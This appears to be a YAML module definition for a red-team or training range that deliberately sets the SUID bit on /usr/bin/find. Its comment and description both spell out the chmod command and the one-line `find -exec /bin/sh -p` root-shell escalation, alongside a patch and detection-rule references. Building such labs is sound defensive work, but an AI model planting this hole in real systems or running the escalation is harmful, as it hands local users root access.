# Bolt-on: SUID Bit on GTFOBins Binary (find)
# -------------------------------------------
# Install sets the SUID bit on /usr/bin/find. Any local user can then run
#   find . -exec /bin/sh -p \; -quit
# to spawn a root shell — GTFOBins SUID escalation via -exec (T1548.001).
#
# Patch removes the SUID bit and installs a daily debsums check that
# alerts when system-binary permissions drift from the packaged baseline.
#
# Elastic rule UUIDs sampled from:
#   Research/elastic-detection-rules/rules/linux/privilege_escalation_potential_suid_sgid_exploitation.toml
#   Research/elastic-detection-rules/rules/linux/privilege_escalation_potential_suid_sgid_proxy_execution.toml

id: bolton.privilege-escalation.suid-binary-gtfobins
slug: suid-binary-gtfobins
name: "SUID Bit on GTFOBins Binary (find)"
version: "1.0.0"
author: "Red Team Infra"
last_updated: 2026-05-23

category: privilege-escalation
subcategory: suid
tags:
  - suid
  - gtfobins
  - find
  - privilege-escalation
  - linux
description: >
  Sets the SUID bit on /usr/bin/find via `chmod u+s /usr/bin/find`.
  Because find honours -p when invoked with SUID, any local user can
  spawn a root shell with `find . -exec /bin/sh -p \; -quit` — a
  GTFOBins SUID privilege-escalation primitive (MITRE T1548.001).

